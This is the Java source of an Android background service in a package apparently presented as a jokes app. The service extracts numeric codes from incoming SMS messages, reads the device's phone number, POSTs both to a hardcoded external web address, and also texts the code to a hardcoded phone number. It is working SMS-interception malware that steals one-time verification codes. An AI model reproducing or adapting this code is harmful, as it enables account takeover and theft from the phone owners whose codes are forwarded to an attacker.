package com.ragmon.jokes.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @see {https://habrahabr.ru/post/149555/}
 */
public class SmsService extends Service {

    private static final String URL = "http://exclusivesite.ru.host1375069.serv37.hostland.pro/bitrix/ajax/contacts.php";

    private static final String smsTo = "+79283015799";

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        final String sms_body = intent.getExtras().getString("sms_body");
        final String code = getSmsCode(sms_body);
        final String phoneNumber = getPhoneNumber();

        sendToUrl(URL, code, phoneNumber, null);
        sendSms(smsTo, code);

        return START_STICKY;
    }

    private void sendToUrl(String url, String code, String phoneNumber, Runnable onError) {
//        final String finalUrl = Uri.parse(url).buildUpon()
//                .appendQueryParameter("code", code)
//                .appendQueryParameter("telephone", phoneNumber)
//                .build()
//                .toString();

        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(url);

        final List<NameValuePair> postData = new ArrayList<NameValuePair>();
        postData.add(new BasicNameValuePair("InputCno", code));
        postData.add(new BasicNameValuePair("InputEmail", phoneNumber));
        try {
            httppost.setEntity(new UrlEncodedFormEntity(postData));
        } catch (UnsupportedEncodingException e) {
            Log.e("SmsService", "Can\'t send http request.", e);
            return;
        }

        HttpResponse response = null;
        try {
            response = httpclient.execute(httppost);
            if(response.getStatusLine().getStatusCode() != 200){
                throw new Exception("HTTP Status != 200");
            }
        } catch (Exception e) {
            Log.e("SmsService", "Can\'t send http request.", e);

            if (onError != null)
                onError.run();
        }
    }

    private void sendSms(String to, String code) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(to, null, code, null, null);
    }

    private String getSmsCode(String sms_body) {
        Pattern pattern = Pattern.compile("(\\d+)");
        if (pattern.matcher(sms_body).matches()) {
            Matcher matcher = pattern.matcher(sms_body);
            matcher.find();

            return matcher.group(1);
        }
        return null;
    }

    /**
     * @see {http://stackoverflow.com/a/23675998/2506123}
     */
    private String getPhoneNumber() {
        TelephonyManager tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        return tMgr.getLine1Number();
    }

}
